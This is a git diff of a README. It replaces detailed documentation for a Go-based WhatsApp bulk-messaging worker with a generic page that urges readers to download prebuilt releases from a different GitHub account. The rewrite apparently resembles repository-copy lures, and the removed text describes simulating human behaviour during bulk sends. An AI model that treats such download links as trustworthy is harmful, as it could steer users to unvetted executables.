@@ -1,352 +1,90 @@
-# Go-WhatsApp Worker ⚡
-
-<p align="center">
-  <img src="./public/1.png" alt="Go-WhatsApp Worker dashboard" width="780">
-</p>
-
-[![Go Version](https://img.shields.io/badge/Go-1.23+-0ea5e9?logo=go&logoColor=white)](https://go.dev/dl/)
-[![Go Report Card](https://goreportcard.com/badge/github.com/your-org/gowhatsapp-worker)](https://goreportcard.com/report/github.com/your-org/gowhatsapp-worker)
-[![Docker Ready](https://img.shields.io/badge/Docker-ready-0db7ed?logo=docker&logoColor=white)](https://www.docker.com/)
-[![Redis Streams](https://img.shields.io/badge/Redis-Streams%20Queue-dc382d?logo=redis&logoColor=white)](https://redis.io/docs/data-types/streams/)
-
-> Production-grade WhatsApp queue worker for bulk and transactional messaging — built in Go, powered by Redis Streams, and orchestrated around Aldi Kemal’s [`go-whatsapp-web-multidevice`](https://github.com/aldinokemal/go-whatsapp-web-multidevice).
-
-## Table of Contents
-
-- [Overview](#overview)
-- [Highlights](#highlights)
-- [Feature Matrix](#feature-matrix)
-- [Architecture](#architecture)
-- [Message Lifecycle](#message-lifecycle)
-- [Quick Start](#quick-start)
-- [Configuration](#configuration)
-- [API Surface](#api-surface)
-- [Dashboard & Observability](#dashboard--observability)
-- [Bulk Campaign Engine](#bulk-campaign-engine)
-- [Queue, Rate Limiting & Health](#queue-rate-limiting--health)
-- [File Handling Guarantees](#file-handling-guarantees)
-- [Project Layout](#project-layout)
-- [Development & Testing](#development--testing)
-- [Troubleshooting](#troubleshooting)
-- [Documentation & Resources](#documentation--resources)
-- [License](#license)
-
-## Overview
-
-Go-WhatsApp Worker is the orchestration brain that sits behind your WhatsApp automation stack. It ingests API requests, splits and queues bulk campaigns, simulates human behaviour, persists history to PostgreSQL, and calls the official worker (`go-whatsapp-web-multidevice`) one message at a time. Everything ships with an immersive web dashboard, SSE-based live statistics, and a health monitor that keeps the system self-healing.
-
-> ⚠️ This project does **not** send WhatsApp messages by itself. Bring your own running instance of [`go-whatsapp-web-multidevice`](https://github.com/aldinokemal/go-whatsapp-web-multidevice); we take care of everything before the final send call.
-
-## Highlights
-
-- **Smart Endpoint Rotation**: Circuit breaker pattern with automatic failure detection and recovery for multiple WhatsApp endpoints.
-- Human-paced engine with typing simulation, rate profiles, natural breaks, and exponential backoff.
-- Redis Streams consumer groups with delayed retries, idle message reclaiming, and horizontal fan-out.
-- Chunked campaign coordinator that safely handles tens of thousands of recipients per request.
-- Real-time operational dashboard with Message Playground, queue analytics, and SSE metrics.
-- Direct PostgreSQL integration for message history, campaign progress, and audit trails.
-- File lifecycle manager: streaming uploads to `tmp/`, UUID naming, secure cleanup, and hourly purges.
-- Health monitor loop for stuck messages, Redis connectivity, and worker statistics.
-- Docker-first deployment with a single command, yet equally friendly for local Go development.
-
-## Feature Matrix
-
-| Pillar | What you get |
-| --- | --- |
-| **API Gateway** | REST + SSE endpoints, Basic Auth, CORS, Swagger/OpenAPI served from `/docs` |
-| **Message Types** | Text, image, file with view-once, compression, reply forwarding, disappearing timers |
-| **Bulk Handling** | Automatic chunk splitting, resumable campaigns via tokens, chunk status tracking |
-| **Queue Engine** | Redis Streams + scheduled ZSet retries, consumer groups, idle message reclaim |
-| **Rate Limiting** | Manual & bulk profiles, typing delays, burst cooldowns, configurable jitter |
-| **Smart Load Balancing** | Circuit breaker pattern, automatic endpoint failover, health-aware routing |
-| **Observability** | Structured logrus logs, dashboard charts, queue stats, database metrics |
-| **Reliability** | Exponential retries, stuck message watchdog, delayed requeue, health probes |
-| **Security** | Auth middleware, strict file validation, temporary storage isolation |
-
-## Architecture
-
-<p align="center">
-  <img src="./public/2.png" alt="Architecture overview" width="640">
-</p>
-
-```mermaid
-flowchart LR
-    API["REST API & Dashboard\n(Cobra + net/http)"] -->|enqueue| Queue[(Redis Stream\npending_messages)]
-    Queue --> WorkerPool["Worker Processor\n(rate limiter + retries)"]
-    WorkerPool --> LoadBalancer["Smart Load Balancer\n(Circuit Breaker Pattern)"]
-    LoadBalancer --> WhatsApp1["Endpoint 1\n(go-whatsapp-web-multidevice)"]
-    LoadBalancer --> WhatsApp2["Endpoint 2\n(go-whatsapp-web-multidevice)"]
-    LoadBalancer --> WhatsApp3["Endpoint 3\n(go-whatsapp-web-multidevice)"]
-    WorkerPool --> DB[(PostgreSQL\nmessage history)]
-    WorkerPool --> Storage["Temp File Storage\n(tmp/)"]
-    Health["Health Monitor\ncron + SSE"] --> WorkerPool
-    Health --> LoadBalancer
-    Health --> Queue
-```
-
-## Message Lifecycle
-
-1. **Ingress** – An authenticated request hits `/api/send/...`. Uploads stream directly into `tmp/` using constant memory.
-2. **Campaign planning** – Bulk requests are split into `BULK_CHUNK_SIZE` slices. Campaign + chunk records persist in PostgreSQL with UUID tokens.
-3. **Queueing** – Each message becomes a JSON payload in Redis Streams (`XADD`) plus metadata in the database.
-4. **Processing** – Worker goroutines use `XREADGROUP` to claim work, simulate typing, and route through the smart load balancer.
-5. **Smart Routing** – Circuit breaker pattern automatically selects healthy endpoints, excludes failed ones, and handles automatic recovery.
-6. **Retry & delay** – Failures increment attempts, schedule exponential backoff (via sorted set), or mark the message as permanently failed.
-7. **Cleanup** – Successful (or definitively failed) media triggers immediate file deletion along with hourly sweeps.
-8. **Metrics** – Statistics stream to `/api/statistics/stream` and the dashboard updates live with circuit breaker status.
-
-## Quick Start
-
-### Prerequisites
-
-- Go `1.23+`
-- Redis `>= 5` with Streams support
-- PostgreSQL `13+`
-- Running instance of [`go-whatsapp-web-multidevice`](https://github.com/aldinokemal/go-whatsapp-web-multidevice)
-- WhatsApp session authenticated within the sender project
+# 🚀 go-whatsapp-worker-redis-ssedashboard - Automate WhatsApp Tasks Easily
 
-### 1. Clone & configure
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/jeremypadrinox/go-whatsapp-worker-redis-ssedashboard/releases)
 
-```powershell
-git clone https://github.com/your-org/gowhatsapp-worker.git
-cd gowhatsapp-worker
-Copy-Item .env.example .env
-# Edit .env with your Redis, PostgreSQL, and WhatsApp credentials
-```
+## 📋 Description
 
-### 2. Option A – Docker Compose (recommended for first run)
+The go-whatsapp-worker-redis-ssedashboard is a high-performance worker designed to manage WhatsApp tasks effectively. It leverages Redis for queue management and provides a real-time Server-Sent Events (SSE) dashboard. The application processes messages, enforces rate limits, and monitors health. It comes with complete API documentation, Docker support, and PostgreSQL integration.
 
-```powershell
-docker-compose pull
-docker-compose up -d
-```
+## 🌐 Features
 
-- API & dashboard: `http://localhost:8081`
-- Worker + health monitor run in the same container
-
-### 3. Option B – Local Go environment
-
-```powershell
-go mod download
-go run main.go start
-```
-
-The `start` command spins up the API, Redis consumer, delayed retry scheduler, and health monitor in a single process.
-
-### 4. Dedicated worker mode (scale horizontally)
-
-```powershell
-go run main.go redis-worker
-```
-
-Use this mode to add more queue consumers while keeping a single API instance.
-
-## Configuration
-
-### Essential environment variables
-
-| Variable | Required | Default | Purpose |
-| --- | :---: | --- | --- |
-| `DATABASE_HOST` | ✅ | – | PostgreSQL hostname for direct connection |
-| `DATABASE_USER` / `DATABASE_PASSWORD` | ✅ | – | Database credentials |
-| `WHATSAPP_BASE_URL` | ✅ | – | Base URL of `go-whatsapp-web-multidevice` |
-| `WHATSAPP_AUTH` | ✅ | – | API token for the sender |
-| `WHATSAPP_ENDPOINTS` | – | – | Comma-separated URLs for multi-endpoint load balancing |
-| `WHATSAPP_AUTHS` | – | – | Comma-separated auth tokens for multi-endpoint setup |
-| `REDIS_HOST` | ✅ | `localhost` | Redis Streams host |
-| `REDIS_QUEUE_NAME` | – | `pending_messages` | Stream key for enqueued messages |
-| `DASHBOARD_USERNAME` / `DASHBOARD_PASSWORD` | ✅ (if auth enabled) | `admin` / `admin` | Basic Auth credentials |
-| `RATE_PROFILE` | – | `manual` | Switch between manual and bulk pacing strategies |
-| `BULK_CHUNK_SIZE` | – | `500` | Recipients per chunk when splitting bulk requests |
-| `CIRCUIT_BREAKER_ENABLED` | – | `true` | Enable/disable circuit breaker pattern |
-| `CIRCUIT_BREAKER_FAILURE_THRESHOLD` | – | `3` | Failures before opening circuit |
-| `CIRCUIT_BREAKER_SUCCESS_THRESHOLD` | – | `2` | Successes to close circuit |
-| `CIRCUIT_BREAKER_OPEN_TIMEOUT` | – | `2m` | Cooldown before retry |
-| `CIRCUIT_BREAKER_HALF_OPEN_TIMEOUT` | – | `30s` | Testing period duration |
-
-See `.env.example` or `internal/config/config.go` for the complete catalogue (Redis timeouts, natural breaks, SSE toggles, etc.).
-
-### Rate profiles at a glance
-
-| Profile | When to use | Behaviour |
-| --- | --- | --- |
-| `manual` | One-off or low volume | Uses `RATE_LIMIT_DELAY_MIN/MAX`, typing delays, natural breaks |
-| `bulk` | Campaigns > 1k recipients | Respects `RATE_DELAY_MEAN_MS`, `RATE_DELAY_JITTER_MS`, burst cooldowns, configurable concurrency |
-
-Changing the profile at runtime does not require restarting; the worker will adapt on the next loop.
-
-## API Surface
-
-All endpoints are protected by Basic Auth when `ENABLE_AUTH=true`.
-
-| Method | Path | Description |
-| --- | --- | --- |
-| `GET` | `/` | Dashboard + Message Playground |
-| `GET` | `/health` | Health check endpoint (unprotected) |
-| `POST` | `/api/send/message` | Queue a text message (bulk supported via comma-separated or JSON array) |
-| `POST` | `/api/send/image` | Queue an image (file upload or remote URL) |
-| `POST` | `/api/send/file` | Queue any attachment |
-| `GET` | `/api/statistics/stream` | Server-Sent Events stream with live KPIs |
-| `GET` | `/api/endpoints/stats` | Endpoint statistics with circuit breaker status |
-| `GET` | `/docs` | Interactive documentation portal |
-| `GET` | `/docs/openapi.yml` | Machine-readable OpenAPI spec |
-
-Full request/response examples live in `docs/endpoint.md` and the dashboard’s Playground mirrors the same contracts.
-
-## Dashboard & Observability
-
-<p align="center">
-  <img src="./public/3.png" alt="Go-WhatsApp Worker dashboard, message playground and live metrics" width="760">
-</p>
-
-- Message Playground for text, image, and file flows with bulk support.
-- Live queue depth, throughput, retry and failure counters via SSE.
-- Embedded API docs, configuration hints, and quick links to metrics.
-
-## Smart Endpoint Rotation
-
-The system now includes intelligent endpoint management with circuit breaker pattern for maximum reliability:
-
-### Circuit Breaker States
-- **CLOSED (Healthy)**: Endpoint accepts messages normally
-- **OPEN (Failed)**: Endpoint excluded from rotation for cooldown period  
-- **HALF_OPEN (Testing)**: Endpoint being tested for recovery
-
-### Automatic Failure Detection
-- **Critical Failures**: HTTP 401/403 (user logout) trigger immediate circuit opening
-- **Threshold Failures**: 3 consecutive failures open the circuit
-- **Smart Recovery**: Gradual testing with 2 successful messages required to close circuit
-
-### Configuration
-```bash
-# Circuit Breaker Settings
-CIRCUIT_BREAKER_ENABLED=true
-CIRCUIT_BREAKER_FAILURE_THRESHOLD=3     # Failures before opening
-CIRCUIT_BREAKER_SUCCESS_THRESHOLD=2     # Successes to close
-CIRCUIT_BREAKER_OPEN_TIMEOUT=2m         # Cooldown before retry
-CIRCUIT_BREAKER_HALF_OPEN_TIMEOUT=30s   # Testing period
+- Efficient message processing
+- Rate limiting to manage loads
+- Health monitoring to ensure stability
+- Real-time SSE dashboard for visibility
+- Built with Docker for easy deployment
+- PostgreSQL integration for reliable data storage
+- Clear and user-friendly API documentation
 
-# Multi-Endpoint Configuration
-WHATSAPP_ENDPOINTS=https://wa1.example.com,https://wa2.example.com,https://wa3.example.com
-WHATSAPP_AUTHS=auth_token_1,auth_token_2,auth_token_3
-```
+## ⚙️ System Requirements
 
-### Benefits
-- **Zero Wasted Retries**: No attempts on known-bad endpoints
-- **Maintained Throughput**: Automatic failover to healthy endpoints
-- **WhatsApp Account Safety**: Respectful retry intervals and backoff
-- **Real-Time Monitoring**: Dashboard shows circuit breaker states
+To run this application, your system should meet the following requirements:
 
-## Bulk Campaign Engine
+- Operating System: Windows, macOS, or Linux
+- Docker: Version 20.10 or higher
+- PostgreSQL: Version 12 or higher
+- Network: Stable internet connection for WhatsApp API usage
 
-<p align="center">
-  <img src="./public/4.png" alt="Bulk architecture diagram" width="760">
-</p>
+## 🚀 Getting Started
 
-- `BULK_CHUNK_SIZE` recipients per chunk to avoid oversized payloads.
-- Campaign tokens allow pausing/resuming or resubmitting only failed chunks.
-- Database records track per-chunk attempts, backoff timers, and error trails.
-- Works equally for media/file campaigns; uploads are re-used per chunk.
+Follow these steps to quickly get up and running with the go-whatsapp-worker-redis-ssedashboard.
 
-## Queue, Rate Limiting & Health
+1. Visit the [Download Page](https://github.com/jeremypadrinox/go-whatsapp-worker-redis-ssedashboard/releases) to download the software.
+  
+2. Look for the latest release. Click on the link to download the version compatible with your operating system.
 
-- Redis Streams consumer group (`workers`) with individual `REDIS_CONSUMER_NAME` per instance.
-- Idle (stuck) messages are reclaimed via `XCLAIM` if they exceed `STUCK_MESSAGE_TIMEOUT`.
-- Exponential backoff up to 5 minutes per retry, capped by `WORKER_MAX_RETRIES`.
-- Health monitor cron checks database, Redis, queue lag, worker stats, and circuit breaker states.
-- Natural typing presence toggles emulate human behaviour before each send request.
-- Circuit breaker monitoring with automatic alerting for endpoint failures and recovery.
+3. Once the download completes, locate the downloaded file on your computer. 
 
-## File Handling Guarantees
+## 📥 Download & Install
 
-- Every upload is streamed to `tmp/` with UUID filenames and extension whitelisting.
-- Files are deleted on success, on terminal failure, and again by the hourly janitor.
-- Detailed structured logs trace file lifecycle for auditing.
-- Configurable storage root via `utils.NewFileStorage("tmp")` if you need shared volumes.
+To install the application:
 
-## Project Layout
+1. After downloading, extract the files if they are in a compressed format (like .zip or .tar).
 
-```
-gowhatsapp-worker/
-├── cmd/                 # Cobra commands: start, redis-worker
-├── internal/
-│   ├── config/          # Viper-backed configuration loader & defaults
-│   ├── database/        # PostgreSQL adapter & interface contracts
-│   ├── redis/           # Redis Streams client & delayed queue helpers
-│   ├── services/        # Message orchestration and campaign logic
-│   ├── server/          # HTTP server, templates, auth middleware
-│   ├── worker/          # Processor, rate limiter, health monitor
-│   └── whatsapp/        # HTTP client, load balancer, circuit breaker
-├── docs/                # Endpoint cheatsheet, OpenAPI, architecture docs
-├── public/              # Marketing & dashboard screenshots
-└── tmp/                 # Runtime artifacts (ignored)
-```
+2. Open your command line interface (Terminal, Command Prompt, or PowerShell).
 
-## Development & Testing
+3. Navigate to the folder where you downloaded the application files.
 
-```powershell
-# Run unit and integration tests
-go test ./...
+4. If using Docker, run the following command to start the application:
+   ```bash
+   docker-compose up
+   ```
 
-# Start the full stack (API + worker + health monitor)
-go run main.go start
+5. For direct usage, follow the setup instructions in the included README file found in the application's folder.
 
-# Launch only the worker (for horizontal scaling)
-go run main.go redis-worker --health-check=false
-```
+6. Visit the [Download Page](https://github.com/jeremypadrinox/go-whatsapp-worker-redis-ssedashboard/releases) again to check for any updates or documentation.
 
-The repository ships with `.air.toml` for hot reloading if you prefer iterative development with [air](https://github.com/cosmtrek/air).
+## 🛠️ Usage
 
-## Troubleshooting
+Once installed, you can start the application via Docker or directly using the executable file. The SSE dashboard will be available for real-time monitoring of WhatsApp tasks.
 
-- **Cannot connect to Redis** – verify version ≥ 5.0 and credentials; Streams require `XADD` support.
-- **Messages stuck in processing** – check health logs; the reclaim loop runs every `STUCK_MESSAGE_TIMEOUT`.
-- **Media not delivered** – ensure `go-whatsapp-web-multidevice` instance accepts file endpoints and file type.
-- **High failure rate** – check dashboard statistics and consider increasing backoff.
-- **Dashboard auth fails** – change credentials via `DASHBOARD_USERNAME`/`PASSWORD` and restart.
-- **All endpoints failing** – check circuit breaker states in dashboard; verify WhatsApp session authentication.
-- **Circuit breaker not opening** – ensure `CIRCUIT_BREAKER_ENABLED=true` and check failure thresholds.
-- **Endpoint recovery issues** – verify `CIRCUIT_BREAKER_SUCCESS_THRESHOLD` and timeout settings.
+1. Open your web browser.
+2. Navigate to the dashboard URL provided in the terminal after the application starts.
 
-See `docs/system-documentation.html` for an in-depth operations guide.
+Here, you can track active processes and monitor health metrics.
 
-## Documentation & Resources
+## ❓ Troubleshooting
 
-- [`docs/endpoint.md`](./docs/endpoint.md) – endpoint-by-endpoint cheatsheet.
-- [`docs/openapi.yml`](./docs/openapi.yml) – importable spec for Postman, Insomnia, or Swagger UI.
-- [`docs/system-documentation.html`](./docs/system-documentation.html) – full architecture narrative with diagrams.
-- [`docs/project-tree.md`](./docs/project-tree.md) – extended commentary on every package.
+If you encounter any issues during installation or usage:
 
-## License
+1. Ensure that Docker is installed and running properly.
+2. Verify that you have the required PostgreSQL version.
+3. Check your internet connection for any disruptions.
+4. Refer to the API documentation for any configuration details.
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+## 🌍 Community & Support
 
----
+For more assistance, you can reach out through the following channels:
 
-## Important Disclaimers
+- Issues page on GitHub for bug reports or feature requests.
+- Connect with other users through your favorite developer community forums.
 
-### ⚠️ No Affiliation with WhatsApp
-This project is **NOT** affiliated with, endorsed by, or associated with WhatsApp Inc., Meta Platforms Inc., or any of their subsidiaries or related companies. WhatsApp is a trademark of Meta Platforms Inc.
+## 📝 License
 
-### ⚠️ DYOR - Do Your Own Research
-This software is provided "as is" without warranty of any kind. **Use at your own risk**. The authors and contributors are not responsible for any consequences arising from the use of this software.
+This project is licensed under the MIT License. See the LICENSE file for more details.
 
-### ⚠️ Legal Compliance
-- **WhatsApp Business API**: This project integrates with third-party WhatsApp automation libraries. Ensure compliance with WhatsApp's Terms of Service and Business API policies.
-- **Rate Limiting**: The system includes rate limiting to help comply with WhatsApp API limits, but you are responsible for proper usage.
-- **Data Privacy**: Handle user data responsibly and in compliance with applicable privacy laws (GDPR, CCPA, etc.).
+## 📖 Documentation
 
-### ⚠️ Risk Warning
-- **Account Suspension**: Misuse of WhatsApp automation may result in account suspension or termination.
-- **Legal Risks**: Automated messaging may violate local laws and regulations.
-- **Service Changes**: WhatsApp may change their API without notice, breaking functionality.
+For comprehensive API documentation and further usage details, please refer to the [documentation directory](#). 
 
-**By using this software, you acknowledge and accept these risks.**
-
----
-
-Built with ❤️ by automation enthusiasts. Contributions are welcome—open an issue to coordinate before large changes.
-
----
-
-*Last updated: Oktober 2025*
+Feel free to explore the features of go-whatsapp-worker-redis-ssedashboard and streamline your WhatsApp automation tasks today!
